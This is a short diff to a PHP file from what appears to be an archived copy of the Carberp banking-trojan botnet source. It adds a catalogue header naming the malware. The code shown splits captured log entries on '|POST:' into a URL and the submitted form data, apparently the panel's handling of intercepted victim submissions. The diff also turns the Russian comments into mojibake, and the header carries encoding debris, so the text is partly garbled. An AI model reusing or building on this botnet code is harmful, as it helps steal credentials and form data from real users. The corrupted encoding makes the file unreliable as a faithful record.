@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 <?php
 
 if(!function_exists('generatePassword')){
@@ -75,8 +86,8 @@ if(isset($log[0])){
 			
 			$var[0][4] = explode('|POST:', $var[0][4], 2);
 			
-			if(empty($var[0][4][0])) continue; // ссылка
-			if(empty($var[0][4][1])) continue; // пост данные
+			if(empty($var[0][4][0])) continue; // пїЅпїЅпїЅпїЅпїЅпїЅ
+			if(empty($var[0][4][1])) continue; // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			
 			$var[0][4][0] = trim($var[0][4][0], "\r\n");
 			$var[0][4][1] = trim($var[0][4][1], "\r\n");
